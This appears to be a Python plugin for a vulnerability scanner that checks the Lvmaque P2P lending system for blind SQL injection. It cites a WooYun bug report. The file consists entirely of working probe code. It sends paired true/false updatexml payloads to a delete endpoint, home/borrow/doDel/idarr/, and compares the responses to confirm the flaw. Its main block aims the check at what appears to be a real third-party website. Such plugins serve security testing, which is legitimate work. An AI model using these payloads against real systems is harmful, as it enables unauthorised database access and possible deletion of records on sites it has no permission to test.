#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = loopx9
#_PlugName_ = 绿麻雀网贷系统通用注入
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-0132817
import re
def assign(service, arg):
    if service == 'lvmaque':
        return True, arg
def audit(arg):
    ture_payload = 'home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)'
    target = arg + ture_payload
    code1, head, res1, errcode, _ = curl.curl2(target)
    false_payload = 'home/borrow/doDel/idarr/updatexml(1,if(1=2,1,0x22),1)'
    target = arg + false_payload
    code2, head, res2, errcode, _ = curl.curl2(target)
    if code1 == 200 and code2==200 and  "\u5220\u9664\u6210\u529f" in res1 and '\u5220\u9664\u6210\u529f' not in res2:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('lvmaque', 'http://www.fusheng100.com/')[1])